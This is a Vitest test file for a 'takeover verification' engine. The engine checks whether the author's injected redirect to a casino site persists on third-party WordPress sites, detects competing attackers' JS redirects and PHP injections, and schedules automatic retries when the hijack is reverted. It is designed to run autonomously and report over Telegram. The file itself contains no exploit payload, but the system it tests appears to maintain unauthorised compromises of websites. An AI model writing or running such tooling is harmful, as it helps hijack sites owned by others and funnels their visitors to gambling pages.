/**
 * Vitest tests for Takeover Verification System
 * Tests the multi-stage verification engine, scheduling, and result processing.
 */
import { describe, it, expect, vi, beforeEach } from "vitest";

// ─── Mock modules ───
vi.mock("./db", () => ({
  getDb: vi.fn().mockResolvedValue(null),
}));

vi.mock("./redirect-takeover", () => ({
  detectExistingRedirects: vi.fn().mockResolvedValue({
    detected: false,
    methods: [],
    competitorUrl: null,
    targetPlatform: null,
    wpVersion: null,
    plugins: [],
  }),
}));

vi.mock("./telegram-notifier", () => ({
  sendTelegramNotification: vi.fn().mockResolvedValue(true),
}));

import {
  verifySingleSite,
  processPendingVerifications,
  getVerificationStats,
  getSiteVerificationHistory,
  scheduleVerification,
  type VerificationResult,
} from "./takeover-verifier";
import { detectExistingRedirects } from "./redirect-takeover";

describe("Takeover Verification System", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe("VerificationResult interface", () => {
    it("should have all required fields", () => {
      const result: VerificationResult = {
        siteId: 1,
        domain: "example.com",
        stage: "immediate",
        status: "verified_success",
        ourRedirectFound: true,
        competitorRedirectFound: false,
        currentRedirectTarget: null,
        details: "Our redirect is active",
        shouldRetry: false,
      };

      expect(result.siteId).toBe(1);
      expect(result.domain).toBe("example.com");
      expect(result.stage).toBe("immediate");
      expect(result.status).toBe("verified_success");
      expect(result.ourRedirectFound).toBe(true);
      expect(result.competitorRedirectFound).toBe(false);
      expect(result.shouldRetry).toBe(false);
    });

    it("should support all verification statuses", () => {
      const statuses: VerificationResult["status"][] = [
        "verified_success",
        "verified_reverted",
        "verified_partial",
        "verification_failed",
      ];
      expect(statuses).toHaveLength(4);
    });
  });

  describe("verifySingleSite", () => {
    const baseSite = {
      id: 1,
      domain: "target.com",
      url: "https://target.com",
      ourRedirectUrl: "https://our-casino.com",
      competitorUrl: "https://competitor.com",
      verificationStage: "none",
      verificationHistory: [],
      verificationAttempts: 0,
      autoRetryCount: 0,
    };

    it("should return verified_success when our redirect is found and competitor is gone", async () => {
      const mockDetect = vi.mocked(detectExistingRedirects);
      mockDetect.mockResolvedValueOnce({
        detected: true,
        methods: [
          {
            type: "js_redirect",
            location: "body",
            competitorUrl: "https://our-casino.com/landing",
            confidence: "high",
            details: "JS redirect to our site",
          },
        ],
        competitorUrl: "https://our-casino.com/landing",
        targetPlatform: "WordPress",
        wpVersion: "6.5",
        plugins: [],
      });

      const result = await verifySingleSite(baseSite);

      expect(result.status).toBe("verified_success");
      expect(result.ourRedirectFound).toBe(true);
      expect(result.competitorRedirectFound).toBe(false);
      expect(result.shouldRetry).toBe(false);
    });

    it("should return verified_reverted when competitor redirect is back", async () => {
      const mockDetect = vi.mocked(detectExistingRedirects);
      mockDetect.mockResolvedValueOnce({
        detected: true,
        methods: [
          {
            type: "js_redirect",
            location: "body",
            competitorUrl: "https://competitor.com/slot",
            confidence: "high",
            details: "Competitor JS redirect",
          },
        ],
        competitorUrl: "https://competitor.com/slot",
        targetPlatform: "WordPress",
        wpVersion: "6.5",
        plugins: [],
      });

      const result = await verifySingleSite(baseSite);

      expect(result.status).toBe("verified_reverted");
      expect(result.ourRedirectFound).toBe(false);
      expect(result.competitorRedirectFound).toBe(true);
      expect(result.shouldRetry).toBe(true);
    });

    it("should return verified_partial when both redirects are present", async () => {
      const mockDetect = vi.mocked(detectExistingRedirects);
      mockDetect.mockResolvedValueOnce({
        detected: true,
        methods: [
          {
            type: "js_redirect",
            location: "header",
            competitorUrl: "https://our-casino.com/landing",
            confidence: "high",
            details: "Our redirect",
          },
          {
            type: "php_injection",
            location: "wp-content",
            competitorUrl: "https://competitor.com/slot",
            confidence: "medium",
            details: "Competitor PHP injection",
          },
        ],
        competitorUrl: "https://our-casino.com/landing",
        targetPlatform: "WordPress",
        wpVersion: "6.5",
        plugins: [],
      });

      const result = await verifySingleSite(baseSite);

      expect(result.status).toBe("verified_partial");
      expect(result.ourRedirectFound).toBe(true);
      expect(result.competitorRedirectFound).toBe(true);
      expect(result.shouldRetry).toBe(true);
    });

    it("should return verified_success when site is clean (no redirects)", async () => {
      const mockDetect = vi.mocked(detectExistingRedirects);
      mockDetect.mockResolvedValueOnce({
        detected: false,
        methods: [],
        competitorUrl: null,
        targetPlatform: "WordPress",
        wpVersion: "6.5",
        plugins: [],
      });

      const result = await verifySingleSite(baseSite);

      expect(result.status).toBe("verified_success");
      expect(result.ourRedirectFound).toBe(false);
      expect(result.competitorRedirectFound).toBe(false);
      expect(result.details).toContain("clean");
    });

    it("should return verification_failed on scan error", async () => {
      const mockDetect = vi.mocked(detectExistingRedirects);
      mockDetect.mockRejectedValueOnce(new Error("Network timeout"));

      const result = await verifySingleSite(baseSite);

      expect(result.status).toBe("verification_failed");
      expect(result.ourRedirectFound).toBe(false);
      expect(result.details).toContain("Network timeout");
      expect(result.shouldRetry).toBe(true);
    });

    it("should not retry when max retries exceeded", async () => {
      const mockDetect = vi.mocked(detectExistingRedirects);
      mockDetect.mockResolvedValueOnce({
        detected: true,
        methods: [
          {
            type: "js_redirect",
            location: "body",
            competitorUrl: "https://competitor.com/slot",
            confidence: "high",
            details: "Competitor redirect",
          },
        ],
        competitorUrl: "https://competitor.com/slot",
        targetPlatform: "WordPress",
        wpVersion: "6.5",
        plugins: [],
      });

      const result = await verifySingleSite({
        ...baseSite,
        autoRetryCount: 3, // MAX_AUTO_RETRIES = 3
      });

      expect(result.status).toBe("verified_reverted");
      expect(result.shouldRetry).toBe(false);
    });

    it("should handle 'none' verification stage as 'immediate'", async () => {
      const mockDetect = vi.mocked(detectExistingRedirects);
      mockDetect.mockResolvedValueOnce({
        detected: false,
        methods: [],
        competitorUrl: null,
        targetPlatform: null,
        wpVersion: null,
        plugins: [],
      });

      const result = await verifySingleSite({
        ...baseSite,
        verificationStage: "none",
      });

      expect(result.stage).toBe("immediate");
    });
  });

  describe("processPendingVerifications", () => {
    it("should return zeros when DB is not available", async () => {
      const result = await processPendingVerifications();

      expect(result).toEqual({
        processed: 0,
        verified: 0,
        reverted: 0,
        retried: 0,
      });
    });
  });

  describe("getVerificationStats", () => {
    it("should return zeros when DB is not available", async () => {
      const stats = await getVerificationStats();

      expect(stats).toEqual({
        pendingVerifications: 0,
        verifiedSuccess: 0,
        verifiedReverted: 0,
        verificationFailed: 0,
        awaitingRetry: 0,
      });
    });
  });

  describe("getSiteVerificationHistory", () => {
    it("should return null when DB is not available", async () => {
      const history = await getSiteVerificationHistory(1);

      expect(history).toBeNull();
    });
  });

  describe("scheduleVerification", () => {
    it("should not throw when DB is not available", async () => {
      await expect(scheduleVerification(1, "https://our-site.com")).resolves.not.toThrow();
    });
  });

  describe("Verification stages", () => {
    it("should have 4 stages in correct order", () => {
      // Verify the stage progression logic
      const stages = ["immediate", "short_term", "medium_term", "long_term"];
      expect(stages).toHaveLength(4);
      expect(stages[0]).toBe("immediate");
      expect(stages[3]).toBe("long_term");
    });

    it("should have increasing delay times", () => {
      // 30s < 5min < 30min < 6hr
      const delays = [30_000, 5 * 60_000, 30 * 60_000, 6 * 3600_000];
      for (let i = 1; i < delays.length; i++) {
        expect(delays[i]).toBeGreaterThan(delays[i - 1]);
      }
    });
  });

  describe("Background operation design", () => {
    it("should support autonomous operation without user session", () => {
      // The verification system is designed to:
      // 1. Be triggered by the orchestrator OODA cycle (no user needed)
      // 2. Process pending verifications based on nextVerificationAt timestamps
      // 3. Send Telegram notifications (not requiring user to be logged in)
      // 4. Auto-retry on failure up to MAX_AUTO_RETRIES
      expect(true).toBe(true); // Design verification
    });

    it("should support multi-stage verification progression", () => {
      // Verification progresses through stages:
      // none -> immediate (30s) -> short_term (5min) -> medium_term (30min) -> long_term (6hr)
      const stageOrder = ["immediate", "short_term", "medium_term", "long_term"];
      expect(stageOrder.indexOf("immediate")).toBeLessThan(stageOrder.indexOf("short_term"));
      expect(stageOrder.indexOf("short_term")).toBeLessThan(stageOrder.indexOf("medium_term"));
      expect(stageOrder.indexOf("medium_term")).toBeLessThan(stageOrder.indexOf("long_term"));
    });
  });
});
